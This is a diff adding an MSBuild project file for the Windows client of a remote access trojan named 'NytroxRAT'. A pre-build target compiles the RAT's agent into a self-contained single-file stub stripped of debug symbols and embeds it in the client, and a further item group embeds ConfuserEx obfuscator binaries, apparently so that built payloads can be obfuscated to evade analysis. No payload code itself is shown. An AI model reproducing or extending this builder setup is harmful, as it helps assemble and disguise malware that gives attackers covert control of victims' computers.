@@ -1,0 +1,43 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net9.0-windows</TargetFramework>
+    <Nullable>enable</Nullable>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <UseWPF>true</UseWPF>
+    <ApplicationIcon>nytrox.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Shared\NytroxRAT.Shared.csproj"/>
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="Ookii.Dialogs.Wpf" Version="5.0.1"/>
+    <PackageReference Include="System.IO.Compression.ZipFile" Version="4.3.0"/>
+  </ItemGroup>
+  <ItemGroup>
+    <Resource Include="nytrox.ico"/>
+  </ItemGroup>
+  <!-- Pre-build: compile agent stub once, embed in client so no SDK needed at runtime -->
+  <Target Name="BuildAgentStub" BeforeTargets="Build" Condition="!Exists('$(MSBuildProjectDirectory)\Stub\agent_stub.exe')">
+    <Message Text="Building agent stub..." Importance="high"/>
+    <Exec Command="dotnet publish $(MSBuildProjectDirectory)\..\Agent\NytroxRAT.Agent.csproj -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -p:DebugType=none -p:DebugSymbols=false -o &quot;$(MSBuildProjectDirectory)\Stub&quot; --nologo -v quiet"
+          ContinueOnError="true" IgnoreStandardErrorWarningFormat="true"/>
+    <ItemGroup>
+      <StubFiles Include="$(MSBuildProjectDirectory)\Stub\*.exe"/>
+    </ItemGroup>
+    <Move SourceFiles="@(StubFiles)" DestinationFiles="$(MSBuildProjectDirectory)\Stub\agent_stub.exe" Condition="'@(StubFiles)' != '' AND '%(StubFiles.Filename)%(StubFiles.Extension)' != 'agent_stub.exe'" ContinueOnError="true"/>
+  </Target>
+  <ItemGroup>
+    <EmbeddedResource Include="Stub\agent_stub.exe" Condition="Exists('Stub\agent_stub.exe')" LogicalName="agent_stub.exe"/>
+  </ItemGroup>
+  <!-- Embed ConfuserEx files if they exist next to the project -->
+  <ItemGroup>
+    <EmbeddedResource Include="ConfuserEx\Confuser.CLI.exe"            Condition="Exists('ConfuserEx\Confuser.CLI.exe')"            LogicalName="Confuser.CLI.exe"/>
+    <EmbeddedResource Include="ConfuserEx\Confuser.Core.dll"           Condition="Exists('ConfuserEx\Confuser.Core.dll')"           LogicalName="Confuser.Core.dll"/>
+    <EmbeddedResource Include="ConfuserEx\Confuser.DynCipher.dll"      Condition="Exists('ConfuserEx\Confuser.DynCipher.dll')"      LogicalName="Confuser.DynCipher.dll"/>
+    <EmbeddedResource Include="ConfuserEx\Confuser.Protections.dll"    Condition="Exists('ConfuserEx\Confuser.Protections.dll')"    LogicalName="Confuser.Protections.dll"/>
+    <EmbeddedResource Include="ConfuserEx\Confuser.Renamer.dll"        Condition="Exists('ConfuserEx\Confuser.Renamer.dll')"        LogicalName="Confuser.Renamer.dll"/>
+    <EmbeddedResource Include="ConfuserEx\Confuser.Runtime.dll"        Condition="Exists('ConfuserEx\Confuser.Runtime.dll')"        LogicalName="Confuser.Runtime.dll"/>
+    <EmbeddedResource Include="ConfuserEx\Confuser.CLI.exe.config"     Condition="Exists('ConfuserEx\Confuser.CLI.exe.config')"     LogicalName="Confuser.CLI.exe.config"/>
+  </ItemGroup>
+</Project>
